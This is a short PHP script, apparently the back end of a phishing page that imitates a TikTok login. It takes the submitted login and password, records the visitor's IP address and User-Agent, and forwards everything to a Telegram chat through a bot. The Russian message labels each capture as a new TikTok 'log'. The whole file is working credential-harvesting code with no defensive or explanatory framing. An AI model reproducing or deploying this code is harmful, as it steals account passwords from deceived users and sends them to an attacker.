<?php
if (isset($_POST['login']) && isset($_POST['password'])){

include('config.php');

	function getIp() {
	  $keys = [
	    'HTTP_CLIENT_IP',
	    'HTTP_X_FORWARDED_FOR',
	    'REMOTE_ADDR'
	  ];
	  foreach ($keys as $key) {
	    if (!empty($_SERVER[$key])) {
	      $ip = trim(end(explode(',', $_SERVER[$key])));
	      if (filter_var($ip, FILTER_VALIDATE_IP)) {
	        return $ip;
	      }
	    }
	  }
	}

	$ip = getIp();

	$useragent = $_SERVER['HTTP_USER_AGENT'];


	

	$bot = new \TelegramBot\Api\Client($tg_token);
	$bot->sendMessage($chat_id, '*Статус:* 🤟[TikTok - Новый лог]
*Логин:* '.$_POST['login'].'
*Пароль:* '.$_POST['password'].'
*IP:* '.$ip.'
*User-Agent:* '.$useragent, 'markdown');
}
?>